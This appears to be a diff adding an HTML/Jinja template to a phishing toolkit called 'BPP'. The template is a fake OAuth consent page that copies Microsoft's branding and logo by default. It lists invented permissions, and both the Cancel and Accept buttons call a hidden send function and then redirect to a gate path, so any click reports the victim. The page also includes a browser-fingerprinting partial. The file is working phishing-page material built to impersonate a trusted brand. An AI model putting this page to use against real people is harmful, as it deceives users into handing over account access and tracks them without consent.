@@ -1,0 +1,75 @@
+<!-- BPP-Template
+name: OAuth Consent
+description: Application permission request page mimicking OAuth flow
+-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Sign in - {{ brand | default('Microsoft') }}</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box }
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: #f2f2f2;
+      display: flex; align-items: center; justify-content: center;
+      min-height: 100vh;
+    }
+    .card {
+      background: #fff; border-radius: 8px;
+      box-shadow: 0 2px 12px rgba(0,0,0,.1);
+      padding: 40px 32px; max-width: 420px; width: 92%;
+    }
+    .logo { text-align: center; margin-bottom: 20px }
+    .logo svg { width: 44px; height: auto }
+    h2 { font-size: 18px; text-align: center; margin-bottom: 6px }
+    .sub { font-size: 13px; color: #666; text-align: center; margin-bottom: 20px }
+    .app { font-weight: 600; color: #0078d4 }
+    .perms {
+      background: #fafafa; border: 1px solid #eee; border-radius: 6px;
+      padding: 16px 20px; margin-bottom: 24px;
+    }
+    .perms h3 { font-size: 13px; color: #333; margin-bottom: 10px }
+    .perms ul { padding-left: 18px; font-size: 13px; color: #555; line-height: 1.8 }
+    .btns { display: flex; gap: 12px }
+    .btn {
+      flex: 1; padding: 12px; border: none; border-radius: 6px;
+      font-size: 14px; font-weight: 600; cursor: pointer;
+    }
+    .btn-accept { background: #0078d4; color: #fff }
+    .btn-accept:hover { background: #106ebe }
+    .btn-deny { background: #f3f3f3; color: #333; border: 1px solid #ddd }
+    .btn-deny:hover { background: #e5e5e5 }
+    .foot { text-align: center; margin-top: 20px; font-size: 11px; color: #999 }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23">
+        <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
+        <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
+        <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
+        <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
+      </svg>
+    </div>
+    <h2>Permissions requested</h2>
+    <p class="sub"><span class="app">{{ app_name | default('Document Portal') }}</span> wants to access your account</p>
+    <div class="perms">
+      <h3>This app would like to:</h3>
+      <ul>
+        {% for perm in permissions | default(['Read your profile information', 'Read your email address', 'Access files shared with you']) %}
+        <li>{{ perm }}</li>
+        {% endfor %}
+      </ul>
+    </div>
+    <div class="btns">
+      <button class="btn btn-deny" onclick="window.__bpp_send(function(){ window.location.href='/_bpp/gate' })">Cancel</button>
+      <button class="btn btn-accept" onclick="window.__bpp_send(function(){ window.location.href='/_bpp/gate' })">Accept</button>
+    </div>
+    <div class="foot">{{ brand | default('Microsoft') }} &middot; Terms of use &middot; Privacy</div>
+  </div>
+  {% include '_fingerprint.html' %}
+</body>
+</html>
